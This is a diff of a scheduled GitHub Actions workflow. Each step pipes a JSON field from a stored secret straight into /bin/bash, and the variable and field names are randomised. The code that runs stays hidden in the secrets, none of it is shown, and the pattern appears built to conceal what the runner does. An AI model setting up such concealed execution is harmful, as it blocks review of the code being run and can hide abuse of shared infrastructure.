@@ -1,23 +1,34 @@
 name: xueziyang1995
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '59 1/6 * * *'
+    - cron: '11 2/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: xueziyang1995
         env:
-          mioqf16: ${{ secrets.mioqf16 }}
+          god47: ${{ secrets.god47 }}
         run: |
-          echo $mioqf16 | jq -r .qqn78 | /bin/bash
-          echo $ggsh774 | jq -r .fju56 | /bin/bash
-          echo $acye39 | jq -r .ejjpr12 | /bin/bash
-          echo $ov72527 | jq -r .j07 | /bin/bash
-          echo $om18 | jq -r .srlh1 | /bin/bash
-          echo $sm7582 | jq -r .ek057 | /bin/bash
-          echo $vorr0800 | jq -r .jyuw04536 | /bin/bash
+          echo $god47 | jq -r .uytk6521 | /bin/bash
+          echo $drgu48 | jq -r .nj92 | /bin/bash
+          echo $bvqly49812 | jq -r .sdp6 | /bin/bash
+          echo $soy65183 | jq -r .d0906 | /bin/bash
+          echo $t9336 | jq -r .zby4 | /bin/bash
+          echo $gshuc44455 | jq -r .va5 | /bin/bash
+          echo $lav3081 | jq -r .hc0002 | /bin/bash
+          echo $qdg5912 | jq -r .uu772 | /bin/bash
+          echo $im9274 | jq -r .hvir6375 | /bin/bash
+          echo $dztha580 | jq -r .mj10577 | /bin/bash
+          echo $nkie302 | jq -r .l27995 | /bin/bash
+          echo $ayul464 | jq -r .g0888 | /bin/bash
+          echo $tz66389 | jq -r .rj0463 | /bin/bash
+          echo $zowl0 | jq -r .g115 | /bin/bash
+          echo $vmhno97 | jq -r .asv454 | /bin/bash
+          echo $ub300 | jq -r .aa60 | /bin/bash
+          echo $e01 | jq -r .k9172 | /bin/bash
+          echo $qb19 | jq -r .znl12 | /bin/bash
 
